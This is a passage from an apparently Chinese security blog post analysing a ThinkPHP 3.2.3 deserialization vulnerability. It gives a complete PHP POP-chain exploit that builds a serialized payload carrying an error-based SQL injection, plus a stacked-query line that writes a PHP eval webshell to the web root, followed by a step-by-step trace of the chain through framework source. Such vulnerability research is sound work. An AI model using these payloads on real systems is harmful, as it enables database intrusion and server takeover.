class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&quot;id&quot;</span>;  <span class="comment">//表的字段名</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;think_user where 0 or updatexml(1,concat(0x7e,user(),0x7e),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Mysql</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span> = <span class="title class_">array</span>(</span><br><span class="line">            &quot;<span class="title class_">debug</span>&quot;    =&gt; 1,</span><br><span class="line">            &quot;<span class="title class_">database</span>&quot; =&gt; &quot;<span class="title class_">thinkphp3</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostname</span>&quot; =&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostport</span>&quot; =&gt; &quot;3306&quot;,</span><br><span class="line">            &quot;<span class="title class_">charset</span>&quot;  =&gt; &quot;<span class="title class_">utf8</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">username</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">password</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723180359882.png"></p>
+<p>不过由于报错注入权限比较低，我们要想拿shell的话需要写入木马，所以可以<strong>开启堆叠</strong>后写入一句话木马</p>
+<p>修改下table键就行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">think_user;<span class="keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;/var/www/html/a.php&quot;# </span><br></pre></td></tr></table></figure>
+
+<h3 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h3><p>因为大多数反序列化漏洞，都是由<code>__destruct()</code>魔术方法引起的，因此全局搜索<code>public function __destruct()</code></p>
+<p>注：在寻找<code>__destruct()</code>可用的魔术方法需遵循“<strong>可控变量尽可能多</strong>”的原则</p>
+<p>比如下图这个，没啥可控参数就不好利用</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722185426755.png"></p>
+<p>这里我们选择<code>ThinkPHP\Library\Think\Image\Driver\Imagick.class.php</code>的<code>__dustruct()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723121155030.png"></p>
+<p>如果<code>$this-img</code>不为空，那么调用<code>destroy()</code></p>
+<blockquote>
+<p>注：这里有一个坑点，就是在PHP7版本中，如果调用一个含参数的方法，却不传入参数时ThinkPHP会报错，而在PHP5版本中不会报错，这也是为什么我们选择PHP5版本搭建</p>
+</blockquote>
+<p>继续全局搜索<code>destroy()</code>方法，跟进<code>ThinkPHP\Library\Think\Session\Driver\Memcache.class.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function destroy($sessID)</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>delete()</code>方法的参数看似可控，其实不可控，因为下方全局搜索后，<code>delete()</code>方法需要的参数大多数都为<code>array</code>形式，而上方传入的是<code>$this-&gt;sessionName.$sessID</code>，即使<code>$this-&gt;sesionName</code>设置为数组<code>array</code>，但是<code>$sessID</code>如果为空值，在PHP中，用<code>.</code>连接符连接，得到的结果为字符串<code>array</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723122038853.png"></p>
+<p>虽然不可控，但我们还是全局搜索一下</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723172640856.png"></p>
+<p>注意到<code>ThinkPHP\Mode\Lite\Model.class.php</code>这里的<code>delete()</code>方法又调用了一次<code>delete()</code>方法，而这里传入的参数是<code>data[pk]</code>，我们跟进一下<code>getPk()</code>，发现完全可控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getPk()</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;pk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在这个方法先添加一行代码<code>echo &quot;&lt;br&gt;&quot;.&quot;success&quot;;</code>，验证一下思路是否正确</p>
+<p>前面一共涉及到三个类，链子为<code>Imagick -&gt; Memcache -&gt; Model</code>，然后构造demo如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Think\Image\Driver &#123;</span><br><span class="line"></span><br><span class="line">    use Think\Session\Driver\Memcache;</span><br><span class="line"></span><br><span class="line">    class Imagick</span><br><span class="line">    &#123;</span><br><span class="line">        private $img;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;img = new Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Think\Session\Driver &#123;</span><br><span class="line"></span><br><span class="line">    use Think\Model;</span><br><span class="line"></span><br><span class="line">    class Memcache</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handle = null;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handle = new Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Think &#123;</span><br><span class="line">    class Model</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $a = new Think\Image\Driver\Imagick();</span><br><span class="line">    echo base64_encode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723173023706.png"></p>
+<p>接下来继续分析，这里<code>$data</code>可控，然后再次调用<code>delete()</code>方法说明<code>$options</code>可控</p>
+<p>我们往下翻注意到第528行有调用<code>delete()</code>方法，那么我们就可以调用自带的数据库类 Mysql.class.php 中的 delete() 方法。不过这里前提是绕过第517行的if语句，所以按照注释我们设 where 键为<code>1=1</code>即可</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723173314682.png"></p>
+<p>结合全局搜索的结果我们跟进到<code>ThinkPHP\Library\Think\Db\Driver.class.php</code>看看</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723174306991.png"></p>
+<p>跟进<code>parseTable()</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    protected function parseTable($tables)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_array($tables)) &#123;</span><br><span class="line">// 支持别名定义</span><br><span class="line">            $array = array();</span><br><span class="line">            foreach ($tables as $table =&gt; $alias) &#123;</span><br><span class="line">                if (!is_numeric($table)) &#123;</span><br><span class="line">                    $array[] = $this-&gt;parseKey($table) . &#x27; &#x27; . $this-&gt;parseKey($alias);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $array[] = $this-&gt;parseKey($alias);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            $tables = $array;</span><br><span class="line">        &#125; elseif (is_string($tables)) &#123;</span><br><span class="line">            $tables = explode(&#x27;,&#x27;, $tables);</span><br><span class="line">            array_walk($tables, array(&amp;$this, &#x27;parseKey&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">        return implode(&#x27;,&#x27;, $tables);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只调用了<code>parseKey()</code>方法，继续跟进</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected function parseKey(&amp;$key)</span><br><span class="line">&#123;</span><br><span class="line">    return $key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有过滤，直接将传入的参数返回</p>
+<p>回到<code>Driver.class.php</code>，我们注意<code>$sql</code>是将<code>$table</code>和<code>DELETE FROM</code>字符串进行拼接，所以这里我们可以通过<code>options[table]</code>去进行报错注入。整理一下POP链为：<code>Imagick -&gt; Memcache -&gt; Model -&gt; Mysql</code>，我们最后只需在Mysql类配置数据库连接信息即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Mysql</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span> = <span class="title class_">array</span>(</span><br><span class="line">            &quot;<span class="title class_">debug</span>&quot;    =&gt; 1,</span><br><span class="line">            &quot;<span class="title class_">database</span>&quot; =&gt; &quot;<span class="title class_">thinkphp3</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostname</span>&quot; =&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostport</span>&quot; =&gt; &quot;3306&quot;,</span><br><span class="line">            &quot;<span class="title class_">charset</span>&quot;  =&gt; &quot;<span class="title class_">utf8</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">username</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">password</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上就是反序列化漏洞的完整分析</p>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/329045.html">https://www.freebuf.com/articles/web/329045.html</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/ThinkPHP/" rel="tag"># ThinkPHP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1.html" rel="prev" title="红日靶场1">
+      <i class="fa fa-chevron-left"></i> 红日靶场1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html" rel="next" title="信呼OA后台getshell分析">
+      信呼OA后台getshell分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPHP3"><span class="nav-number">1.</span> <span class="nav-text">ThinkPHP3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.1.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.1.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE"><span class="nav-number">1.1.3.</span> <span class="nav-text">数据库配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP3-2-3-where%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">ThinkPHP3.2.3 where注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">1.2.1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP3-2-3-exp%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.</span> <span class="nav-text">ThinkPHP3.2.3 exp注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP3-2-3-bind%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.</span> <span class="nav-text">ThinkPHP3.2.3 bind注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.5.</span> <span class="nav-text">ThinkPHP3.2.3 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POP%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">1.5.2.</span> <span class="nav-text">POP链分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.6.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
